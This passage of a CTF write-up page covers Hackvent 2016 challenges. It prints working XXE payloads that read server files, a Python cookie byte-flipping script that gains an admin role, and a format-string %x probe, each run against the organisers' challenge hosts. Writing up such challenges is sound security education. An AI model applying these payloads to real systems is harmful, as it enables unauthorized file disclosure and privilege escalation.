+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</pre></table></code></div></div><p>Yes! this works:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre>$ java -jar jcoinz.jar
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+[..]
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147482308
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;.rpmdb
+bin
+boot
+cdrom
+dev
+etc
+export
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+&lt;/foo&gt;
+</pre></table></code></div></div><p>So we check in the <code class="language-plaintext highlighter-rouge">home</code> folder, and by repeatedly sending xml messages we eventually find a file in <code class="language-plaintext highlighter-rouge">/home/jcoinz</code> that contains the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre>$ nc challenges.hackvent.hacking-lab.com 3117
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1336
+
+[?] Action: 1
+[?] Amount of jcoinz to send: 1333
+[-] Decreased the account of "billy" by 1333
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1
+
+[?] Action: 1
+[?] Amount of jcoinz to send: -2147483648
+[-] Decreased the account of "billy" by -2147483648
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147483647
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;jcoinz
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147480969
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home/jcoinz" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;9f40461baba9bf00ba9174beeeb9b8a80c0ffba6
+jcoinz.jar
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147479630
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home/jcoinz/9f40461baba9bf00ba9174beeeb9b8a80c0ffba6" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;
+You did it!
+
+Greets, MuffinX
+
+HV16-y4h0-g00t-d33m-c01n-zzzz
+
+If you liked this challenge, tweet me: https://twitter.com/muffiniks
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147478291
+
+[?] Action:
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-y4h0-g00t-d33m-c01n-zzzz </code><hr><h1 id="dec-14-radio-wargame"> Dec 14: Radio Wargame <a href="/CTF-writeups-public/writeups/Hackvent_2016/14-dec-14-radio-wargame.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>The quieter you become, the more you are able to hear</em></p><p>A UK football fan transmits chants and hopes the gods of football pick it up and consider his favorite, Manchester, to win the cup.</p><p>Santa, while using his ham radio station to receive wish-lists from earth, picked it up and saved a copy for his data lake. Can you help Santa to make sense of the signals?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We open the file in audacity:</p><p><img src="writeupfiles/dec14_audacity.png" alt="" /></p><p>and manually decode using Manchester encoding (as indicated by challenge description)</p><p><img src="writeupfiles/manchester.png" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>01001000 01010110 00110001 00110110 00101101 00110001 00110011 00110011 00110111 00101101 01010010 01100001 01100100 01101001 00101101 01101111 01010111 01100001 01110010 00101101 01100111 01100001 01101101 01100101 00101101 00110001 00110011 00110011 00110111
+</pre></table></code></div></div><p>This gives us the nugget when converted to ascii</p><h2> Flag</h2><code> HV16-1337-Radi-oWar-game-1337 </code><hr><h1 id="dec-15-sap-santas-admin-panel"> Dec 15: SAP - Santas Admin Panel <a href="/CTF-writeups-public/writeups/Hackvent_2016/15-dec-15-sap---santas-admin-panel.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>you better know how to flip around</em></p><p>You got access to Santa’s hompage. But without admin rights there’s nothing to see here…</p><p>A valid login is: raindeer10 / s4nt4</p><p><a href="http://challenges.hackvent.hacking-lab.com/4dm1nP4n3l/index.php">Admin Panel</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We log in to the site with the provided credentials, navigate to the admin panel and see this:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Hackvent 2016<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"./css/main.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"background-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
+    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"navbar"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"user-info"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;a&gt;</span>Logged in as: raindeer10<span class="nt">&lt;/a&gt;</span>
+            <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"./img/santa_profile.png"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;a&gt;</span>User Role: Standard<span class="nt">&lt;/a&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"main.php"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"admin.php"</span><span class="nt">&gt;</span>Adminpanel<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"main.php?action=logout"</span><span class="nt">&gt;</span>Logout<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+    <span class="nt">&lt;/ul&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"home"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"flag_container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;p&gt;</span>Only for admins and h4x0rs!<span class="nt">&lt;/p&gt;</span>
+            <span class="nt">&lt;p&gt;</span>Flag not shown!<span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;/diV&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>So our role is <code class="language-plaintext highlighter-rouge">Standard</code> and we get a message that the flag is not shown, so presumably we need to change our role</p><p>we notice a cookie:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Cookie: cmlnaHRz=5WT4yVGAfS%2Fn0z5MzSbbZd0K3vpWLmhfxuFo85apE%2Bo%3D; PHPSESSID=kj2snoalv4a0d5v3du0oa1rvv4
+</pre></table></code></div></div><p>and <code class="language-plaintext highlighter-rouge">cmlnaHRz</code> is base64 for <code class="language-plaintext highlighter-rouge">rights</code> so presumably we have to edit that cookie somehow to change our role.</p><p>If we do this randomly, we get <code class="language-plaintext highlighter-rouge">Role=None</code> so need to be smart about it… hint suggests <em>flipping around</em> but what? ..bits? bytes?</p><p>To see which bytes give a different role when changed, we increase each of them in turn and see what we get:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">urllib</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="n">url</span><span class="o">=</span><span class="sh">"</span><span class="s">http://challenges.hackvent.hacking-lab.com/4dm1nP4n3l/admin.php</span><span class="sh">"</span>
+
+<span class="n">rights</span><span class="o">=</span><span class="sh">"</span><span class="s">5WT4yVGAfS/n0z5MzSbbZd0K3vpWLmhfxuFo85apE+o=</span><span class="sh">"</span>
+
+<span class="n">cookie</span><span class="o">=</span><span class="nf">dict</span><span class="p">(</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="sh">"</span><span class="s">0aim1o2udt333jht40ls9c9mj4</span><span class="sh">"</span><span class="p">,</span><span class="n">cmlnaHRz</span><span class="o">=</span><span class="n">urllib</span><span class="p">.</span><span class="nf">quote_plus</span><span class="p">(</span><span class="n">rights</span><span class="p">))</span>
+<span class="n">hexcookie</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">rights</span><span class="p">))</span>
+
+<span class="n">new</span><span class="o">=</span><span class="sh">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">hexcookie</span><span class="p">),</span><span class="mi">2</span><span class="p">):</span>
+    <span class="n">new</span> <span class="o">+=</span> <span class="nf">hex</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">hexcookie</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">64</span><span class="p">):</span>
+    <span class="n">newrights</span> <span class="o">=</span> <span class="n">hexcookie</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">new</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="n">hexcookie</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
+
+    <span class="n">cookie</span><span class="o">=</span><span class="nf">dict</span><span class="p">(</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="sh">"</span><span class="s">0aim1o2udt333jht40ls9c9mj4</span><span class="sh">"</span><span class="p">,</span><span class="n">cmlnaHRz</span><span class="o">=</span><span class="n">urllib</span><span class="p">.</span><span class="nf">quote_plus</span><span class="p">(</span><span class="n">newrights</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">):</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">Role</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">Admin</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+            <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+</pre></table></code></div></div><p>Huh! this already got us an admin role in a few of the cases, neat!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hackvent 2016&lt;/title&gt;
+    &lt;link rel="stylesheet" type="text/css" href="./css/main.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="background-container"&gt;&lt;/div&gt;
+        &lt;ul class="navbar"&gt;
+            &lt;div class="user-info"&gt;
+                &lt;a&gt;Logged in as: raindeer10&lt;/a&gt;
+                &lt;img src="./img/santa_profile.png"&gt;
+                &lt;a&gt;User Role: Admin&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;li&gt;&lt;a href="main.php"&gt;Home&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href="admin.php"&gt;Adminpanel&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href="main.php?action=logout"&gt;Logout&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;div class="home"&gt;
+            &lt;div class="flag_container"&gt;
+                &lt;p&gt;Congratulations! You are a 1337 h4x0r!&lt;/p&gt;
+                &lt;p&gt;Please get the flag!&lt;/p&gt;
+                &lt;img src="./img/a1be12d908971ecbebfeb1d5d2874464.png"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre></table></code></div></div><p>so we are given the location of our flag, <code class="language-plaintext highlighter-rouge">./img/a1be12d908971ecbebfeb1d5d2874464.png</code></p><p><img src="writeupfiles/dec15_ball.png" alt="" /></p><h2> Flag</h2><code> HV16-R41n-d33r-8yt3-Fl1p-H4ck </code><hr><h1 id="dec-16-marshmallows"> Dec 16: Marshmallows <a href="/CTF-writeups-public/writeups/Hackvent_2016/16-dec-16-marshmallows.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>type: “nomnomnom marhshmallow nomnomnom muffin%x was here”</p><p><strong>Challenge</strong> There’s this guy Randy, he loves marshmallows and programming in python and C. Prove him by hacking his server, that it’s not a good idea to code if you had too many marshmallows.</p><p>nc challenges.hackvent.hacking-lab.com 1033</p><p><strong>Solution</strong> Following their hint, I connect and type the string:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>&gt; 1
+[+] Please give me some marshmallows: nomnomnom marhshmallow nomnomnom muffin%x was here
+nomnomnom marhshmallow nomnomnom muffin968900 was here
+[+] Menu
+</pre></table></code></div></div><p>Which naturally leads to asking:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>[+] Please give me some marshmallows: %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+9689001c9aed885c8a785c8a77532dd3ab929430b9293e01b21d40cb929378b92937cb929390010b9292e01c2a0340b9294300b9294e0b92923008b9
+2938cb929388b929390111b929430b929540b18a7400b929480b929430b9294e00b9294101b9295401b42f12d1b63883042b9294602b9294601b4317
+3c0206a120b9295401b42d56eb9294601b42f03f1b638830206a120206a140006e0b929460b9294501ea422001c2a034001101b9294501fef3b81b65
+0a481c60a7602b9293f01c894e5800b18a7400b9295c01b17643001b648c88001b666ee81b42f6a31c2a0340001ea4220001b6a9688206aa10696373
+611ca136c01ca1ac18206aa101b648c881b650a481f0dcf81c9aab591b648c881f0db781b1764301ea4220048a487000001c2d0f891c9aaa281f0dcf
+01c9fca981f0dcf001c93d3001c9401e0121f0dcf0101f0dcf01c9aaa561f0db781c961d8801ea42201f0dcf81f604101ea40701c9401e001c9401e0
+1c9401e0509d991c916ea01c9a73c881c9401e01f0db781f0dcf01ea42200048e45b1ea4070001edd5d0000001c9401e01f72a405595b31015238ce0
+1edd5d01c8a34881c9401e01c9a73c81c9a73c8011f72a4048f15b0000011f72a405597301c8a07c01ea40701f048d04793c5b92998001ea40701c84
+54d51c9a73c81c9a73c81c9674381c9a73c81c8a22901c9a64a81f048d01c8a22ae14797a2b929980ffffffffb9299800b9221231c8a22901f048d01
+c8a071001ea40e011c8a227005bfaa006e1f048d0001c3c9d0101c3c9df6fd04815b0f181c400840100085854103c3ad01a8e584e04b30584e06ca1f
+355ed1000031ea40401ea401001ea4070347d9f41ea40702b929aa00056d55cb929b80001c26df450b929b88047d8c0041b709aa56d55cb929b80007
+4d709aafc4d09aa0005c13f0b929b8830056d55cb929b80056d585b929b781c3b92ae93b92ae9bb92ae9e0b92aec1b92aed7b92aef3b92af0bb92af2
+0b92af3ab92af502062a80b92af82b92afc4b92afd4b92afda021b9bd00010fabfbff61000116434000404385971c82f00080956d55cb3e8c3e8d3e8
+e3e817019b929d491fb92afe7fb929d590008a74c3002920dbaa36387884000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000
+</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="dec-17-i-want-to-play-a-game"> Dec 17: I want to play a Game <a href="/CTF-writeups-public/writeups/Hackvent_2016/17-dec-17-i-want-to-play-a-game.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> so, you enjoyed the first part? that was soooo 90ties - here is something more modern for you to play.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>writeupfiles/ReGame_2nd_Part_modern.velf: ELF 32-bit LSB ARM, EABI5 version 1 (SYSV)
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             ELF, 32-bit LSB processor-specific, ARM, version 1 (SYSV)
+</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="dec-19-zebra-code"> Dec 19: Zebra Code <a href="/CTF-writeups-public/writeups/Hackvent_2016/18-dec-19-zebra-code.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Get it straight</em></p><p>Get the key and the encrypted message.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We’re given a .png file with a black and white zebra, as well as an SVG file containing points. Naively assumed that points in SVG file map to positions on the zebra, and attempted to extract those pixels. The results are very black/white like one would expect. However extracting those pixel values doesn’t produce legible data. Additionally the number of points is different from what we would expect if that was simply the encoding (4 chars too long)</p><p>I wonder what it means to “get it straight”. Maybe determine angles between points? No luck there either, still looks like garbage data.</p><p>Maybe an extra level of encryption between the two? One is a binary key and the other a binary message? Argh.</p><h2> Flag</h2><code> unsolved </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/shiltemann/CTF-writeups-public/tree/main/website/writeups/Hackvent_2016/index.md"><i class="fab fa-github"></i> Edit on GitHub </a></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" 